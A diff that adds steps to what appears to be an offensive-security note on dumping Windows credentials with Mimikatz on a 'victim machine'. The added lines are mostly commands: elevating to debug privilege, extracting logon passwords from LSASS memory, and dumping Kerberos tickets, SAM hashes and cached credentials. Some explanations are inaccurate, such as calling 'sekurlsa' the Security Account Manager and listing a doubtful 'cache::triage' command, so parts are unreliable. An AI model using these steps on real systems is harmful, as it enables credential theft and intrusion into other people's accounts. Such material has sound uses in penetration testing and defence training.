@@ -24,5 +24,26 @@ description: >-
 2. Run Mimikatz.exe on the victim machine:
 
 ```
-.\
+.\mimikatz.exe
+```
+
+3. In the Mimikatz command line, run:
+
+```
+privilege::debug
+sekurlsa::logonpasswords 
+```
+
+-> privilege::debug elevates to debug privileges to be able to access the LSASS process to be able to extract creds from Windows memory.
+
+-> sekurlsa::logonpasswords dumps all logged-in user passwords from the Security Account Manager (sekurlsa).
+
+
+
+4. You could also run:
+
+```
+sekurlsa::tickets ## Dumps Kerberos tickets
+lsadump::sam ## Dumps SAM database hashes
+cache::triage ## Dumps cached credentials 
 ```
